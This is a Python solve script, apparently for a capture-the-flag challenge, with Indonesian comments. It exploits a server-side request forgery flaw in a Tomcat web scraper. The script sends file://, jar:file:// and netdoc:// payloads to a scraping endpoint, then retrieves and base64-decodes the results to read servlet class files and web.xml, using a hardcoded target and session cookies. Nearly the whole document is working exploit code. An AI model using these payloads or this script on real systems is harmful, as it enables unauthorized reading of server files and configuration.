import requests
import base64
import re

# --- KONFIGURASI ---
HOST = "http://gzcli.1pc.tf:41436"
# Ganti dengan JSESSIONID dari log kamu agar session-nya nyambung
COOKIES = {
    "JSESSIONID": "134872213806E695F877D10AC20DFF05", 
    "session": "HmreTJ9IqForTHwKreX8T3I6KdKZFUs4"
}

# Payload yang akan dicoba (Urutan prioritas untuk Java SSRF)
payloads = [
    # 1. Cek apakah ContactServlet ada di dalam JAR (gunakan wrapper jar:)
    "jar:file:///usr/local/tomcat/lib/demo-1.0-SNAPSHOT.jar!/com/example/ContactServlet.class",
    
    # 2. Cek apakah ada di folder classes (WEB-INF)
    "file:///usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/example/ContactServlet.class",
    
    # 3. Coba baca web.xml menggunakan protokol netdoc (Bypass jika file:// diblokir untuk folder tertentu)
    "netdoc:///usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml",
    
    # 4. Cek global web.xml Tomcat (siapa tau ada mapping disana)
    "file:///usr/local/tomcat/conf/web.xml"
   
]

def solve():
    print(f"[+] Target: {HOST}")
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/143.0.0.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    for payload in payloads:
        print(f"\n[*] Trying payload: {payload}")
        
        # 1. INJECT (POST)
        data = {
            "websiteUrl": payload,
            "scrapingType": "html",
            "includeImages": "false"
        }
        
        try:
            r_post = requests.post(f"{HOST}/scraper-handler.jsp", headers=headers, cookies=COOKIES, data=data, allow_redirects=False)
            
            # Kita mengharapkan 302 Redirect (seperti di log kamu)
            if r_post.status_code == 302:
                print("   [+] Injection successful (Got 302 Redirect)")
            else:
                print(f"   [!] Unexpected status on POST: {r_post.status_code}")
                
            # 2. RETRIEVE (GET)
            # Kita request endpoint get-content dengan url yang sama
            r_get = requests.get(f"{HOST}/get-content.jsp", params={"url": payload}, headers=headers, cookies=COOKIES)
            
            if r_get.status_code == 200:
                content = r_get.text.strip()
                
                # Cek apakah isinya pesan error atau base64
                if "Training data not found" in content or len(content) < 5:
                    print("   [-] No data returned.")
                else:
                    try:
                        # Coba decode
                        decoded = base64.b64decode(content).decode('utf-8', errors='ignore')
                        print(f"\n[SUCCESS] CONTENT FOUND FOR: {payload}")
                        print("="*50)
                        print(decoded)
                        print("="*50)
                        if "CTF" in decoded or "{" in decoded:
                            break
                    except:
                        print(f"   [-] Response not Base64: {content[:30]}...")
            else:
                print(f"   [-] Get failed: {r_get.status_code}")

        except Exception as e:
            print(f"   [-] Error: {e}")

if __name__ == "__main__":
    solve()
